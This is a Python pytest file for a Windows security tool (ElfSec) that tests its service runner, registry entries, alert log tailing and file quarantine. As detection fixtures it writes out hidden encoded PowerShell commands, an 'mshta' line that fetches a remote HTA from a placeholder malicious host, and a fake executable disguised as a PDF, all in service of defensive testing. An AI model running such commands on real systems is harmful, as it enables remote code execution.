"""v1.3.0: Windows Güvenlik Eklentisi (servis, tepsi, kayıt defteri, ENCM, AlertBridge) testleri."""

import json
import os

from app import secret_vault
from app.cli import main as cli_main, parse_protocol_uri
from app.kontrol import run_kontrol
from app.settings_store import load_file_values, upsert_kv
from app.win_plugin import AlertBridge, build_registry_entries
from app.win_service import ServiceRunner, build_sc_create_args


def test_machine_vault_encm_roundtrip(tmp_path):
    p = tmp_path / "machine.env"
    stored = upsert_kv(p, "IMAP_PASSWORD", "gizli-servis-sifre", secret=True, scope="machine")
    if os.name == "nt":
        assert stored.startswith("ENCM(")
        assert secret_vault.is_protected(stored)
    vals, _w = load_file_values(p)
    assert vals["imap_password"] == "gizli-servis-sifre"


def test_build_sc_create_args():
    args = build_sc_create_args(r"C:\Program Files\ElfSec\elfsec.exe", watch_interval=5, mail_interval=15)
    assert args[:3] == ["sc.exe", "create", "ElfSecGuard"]
    assert "binPath=" in args and "start=" in args and "auto" in args
    bin_idx = args.index("binPath=") + 1
    assert "service run --watch-interval 5 --mail-interval 15" in args[bin_idx]


def test_build_registry_entries_hklm_vs_hkcu():
    hklm = build_registry_entries(r"C:\Program Files\ElfSec\elfsec.exe", user_only=False)
    hkcu = build_registry_entries(r"C:\Program Files\ElfSec\elfsec.exe", user_only=True)
    assert all(e["hive"] == "HKLM" for e in hklm)
    assert all(e["hive"] == "HKCU" for e in hkcu)
    paths = {e["path"] for e in hklm}
    assert r"Software\Classes\*\shell\ElfSecScan\command" in paths
    assert r"Software\Classes\Directory\shell\ElfSecScan\command" in paths
    assert r"Software\Classes\elfsec\shell\open\command" in paths
    assert r"Software\Microsoft\Windows\CurrentVersion\Run" in paths


def test_service_runner_once_unconfigured_imap(monkeypatch, tmp_path):
    from app import settings_store

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("ELFSEC_CONFIG_DIR", str(tmp_path / "cfg"))
    monkeypatch.setenv("APPDATA", str(tmp_path / "cfg"))
    monkeypatch.delenv("ELFSEC_CONFIG", raising=False)
    monkeypatch.delenv("IMAP_PASSWORD", raising=False)
    monkeypatch.delenv("IMAP_USER", raising=False)
    settings_store.set_explicit(None)

    try:
        dl = tmp_path / "Downloads"
        dl.mkdir()
        (dl / "sahte.pdf").write_bytes(b"MZ\x90\x00disguised")
        data_dir = tmp_path / "ProgramData"

        runner = ServiceRunner(
            data_dir=data_dir,
            watch_dirs=[dl],
            alert_on="HIGH",
            action="notify-only",
            notify=False,
            enable_mail=True,
        )
        snap = runner.run_once()
        assert snap["files_scanned"] == 1
        assert snap["file_alerts"] == 1
        assert snap["imap_status"] == "unconfigured"
        assert (data_dir / "service_status.json").exists()
        assert (data_dir / "guard_alerts.jsonl").exists()
    finally:
        settings_store.set_explicit(None)


def test_alert_bridge_tails_only_new_lines(tmp_path):
    log = tmp_path / "guard_alerts.jsonl"
    log.write_text(json.dumps({"subject": "eski-alarm", "risk_score": 80}) + "\n", encoding="utf-8")

    bridge = AlertBridge(log, seek_end=True)
    assert bridge.poll_once() == []

    with open(log, "a", encoding="utf-8") as fh:
        fh.write(json.dumps({"subject": "yeni-alarm", "risk_score": 90}) + "\n")
    fresh = bridge.poll_once()
    assert len(fresh) == 1
    assert fresh[0]["subject"] == "yeni-alarm"
    assert bridge.poll_once() == []


def test_protocol_quarantine_file_parse_and_cli(tmp_path):
    src = tmp_path / "drop.ps1"
    src.write_text("powershell -enc AAAA", encoding="utf-8")
    parsed = parse_protocol_uri(f"elfsec:quarantine-file?path={src}")
    assert parsed == ("quarantine-file", {"path": str(src)})

    assert cli_main(["quarantine-file", str(src), "--quarantine-dir", str(tmp_path / "q")]) == 0
    assert not src.exists()
    assert list((tmp_path / "q").glob("*.quarantined"))


def test_plugin_and_service_status_cli(capsys):
    assert cli_main(["plugin", "status", "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert "service" in out and "context_menu_files" in out

    assert cli_main(["service", "status", "--json"]) == 0
    sout = json.loads(capsys.readouterr().out)
    assert sout["service_name"] == "ElfSecGuard"


def test_kontrol_win_category_clean():
    r = run_kontrol(["WIN"])
    assert r["fail"] == 0, r
    assert r["warn"] == 0, r
    assert r["toplam"] >= 8


def test_cli_scan_path_dir_quarantine_and_service_once(monkeypatch, tmp_path):
    from app import settings_store
    from app.notify import build_toast_xml, notify_clipboard_alarm, notify_file_alarm
    from app.win_plugin import install_plugin, run_agent

    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("ELFSEC_CONFIG_DIR", str(tmp_path / "cfg"))
    monkeypatch.setenv("APPDATA", str(tmp_path / "cfg"))
    monkeypatch.setenv("PROGRAMDATA", str(tmp_path / "pd"))
    settings_store.set_explicit(None)

    try:
        d = tmp_path / "bundle"
        d.mkdir()
        (d / "ok.txt").write_text("temiz", encoding="utf-8")
        (d / "evil.ps1").write_text("powershell -w hidden -enc JAB4", encoding="utf-8")
        qdir = tmp_path / "qvault"
        code = cli_main([
            "scan-path", str(d), "--quarantine", "--quarantine-dir", str(qdir),
            "--fail-on", "HIGH",
        ])
        assert code == 1
        assert list(qdir.glob("*.quarantined"))

        # service run --once CLI
        dl = tmp_path / "dl"
        dl.mkdir()
        (dl / "drop.bat").write_text("mshta http://evil.tk/x.hta", encoding="utf-8")
        assert cli_main([
            "service", "run", "--once", "--no-mail", "--watch-dir", str(dl), "--json",
        ]) == 0

        # agent --once CLI
        assert run_agent(tray=False, clipboard=False, alert_log=str(tmp_path / "none.jsonl"), notify=False, once=True) == 0
        assert cli_main(["agent", "--once", "--clipboard", "off", "--notify", "off"]) == 0

        # toast builders + non-admin guard
        xml = build_toast_xml("DOSYA", "detay", [("Karantina", "elfsec:quarantine-file?path=x")])
        assert "quarantine-file" in xml
        assert callable(notify_file_alarm) and callable(notify_clipboard_alarm)
        if os.name == "nt":
            monkeypatch.setattr("app.win_plugin.is_admin", lambda: False)
            res = install_plugin(user_only=False)
            assert res["ok"] is False
    finally:
        settings_store.set_explicit(None)


def test_win_service_and_plugin_mocked_ops(monkeypatch, tmp_path):
    import threading
    from app import win_plugin, win_service

    assert isinstance(win_service.is_admin(), bool)
    assert win_service.resolve_exe_path(str(tmp_path / "elfsec.exe")).endswith("elfsec.exe")

    monkeypatch.setattr(win_service, "machine_data_dir", lambda: tmp_path / "pd")
    monkeypatch.setattr(win_plugin, "machine_data_dir", lambda: tmp_path / "pd")
    assert win_service.ensure_machine_data_dir().exists()

    # ServiceRunner run_forever + stop_event
    dl = tmp_path / "dl"
    dl.mkdir()
    runner = win_service.ServiceRunner(data_dir=tmp_path / "pd", watch_dirs=[dl], watch_interval_sec=1,
                                       notify=False, enable_mail=False)
    ev = threading.Event()
    threading.Timer(0.15, ev.set).start()
    runner.run_forever(ev)
    assert (tmp_path / "pd" / "service_status.json").exists()

    # Mock sc.exe calls
    monkeypatch.setattr(win_service, "is_admin", lambda: True)
    monkeypatch.setattr(win_service, "_run_sc", lambda args: (0, "RUNNING"))
    monkeypatch.setattr(win_plugin, "is_admin", lambda: True)
    monkeypatch.setattr(win_plugin, "_apply_registry_entries", lambda entries: None)
    monkeypatch.setattr(win_plugin, "_remove_registry_entries", lambda user_only=False: None)
    monkeypatch.setattr(win_plugin, "_launch_agent_detached", lambda exe: True)
    monkeypatch.setattr(win_plugin, "install_service", lambda **kw: (True, "ok"))
    monkeypatch.setattr(win_plugin, "start_service", lambda: (True, "started"))
    monkeypatch.setattr(win_plugin, "uninstall_service", lambda: (True, "removed"))

    ok_i, _ = win_service.install_service(exe_path="elfsec.exe")
    assert ok_i is True
    assert win_service.start_service()[0] is True
    assert win_service.stop_service()[0] is True
    assert win_service.uninstall_service()[0] is True
    assert win_service.service_status()["service_name"] == win_service.SERVICE_NAME

    res_p = win_plugin.install_plugin(exe_path="elfsec.exe", user_only=False, with_service=True, start_now=True)
    assert res_p["ok"] is True and res_p["agent_started"] is True
    res_u = win_plugin.uninstall_plugin(user_only=False)
    assert res_u["ok"] is True

    # CLI table & text outputs
    assert cli_main(["plugin", "status"]) == 0
    assert cli_main(["service", "status"]) == 0
    assert cli_main(["clipboard", "--once", "--text", "http://evil.tk/verify", "--json", "--notify", "off", "--fail-on", "NEVER"]) == 0
    assert cli_main(["scan-path", str(dl), "--json", "--fail-on", "NEVER"]) == 0
